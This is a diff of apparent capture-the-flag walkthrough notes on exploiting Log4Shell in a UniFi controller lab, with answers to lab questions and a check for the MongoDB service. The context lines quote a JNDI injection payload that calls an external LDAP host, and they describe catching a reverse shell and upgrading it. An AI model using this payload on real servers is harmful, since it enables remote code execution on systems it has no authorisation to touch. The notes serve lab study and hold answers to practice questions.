@@ -50,7 +50,7 @@ It looks like ldap traffic goes to port 389
 
 Q8: What port is the MongoDB service running on?
 
-A: 
+A: 27117
 
 So, according to this article (https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) in the remember parameter goes a payload ("${jndi:ldap://eb0uvi.dnslog.cn:1389/o=tomcat}\"), but as i'm not using that tool (dnslog.cn) i just use my ip and tcpdump
 I get an error
@@ -64,7 +64,9 @@ in burp suite we replace the payload form the remember parameter with our new jd
 we get the connection
 ![](../../Img/Pasted%20image%2020250424163652.png)
 Upgrade it (script /dev/null -c bash)
-Now finally for the question
+Now finally for the question let's check if mongo is running (ps aux | grep mongo)
+![](../../Img/Pasted%20image%2020250424163929.png)
+
 Q9: What is the default database name for UniFi applications?
 
 A: 
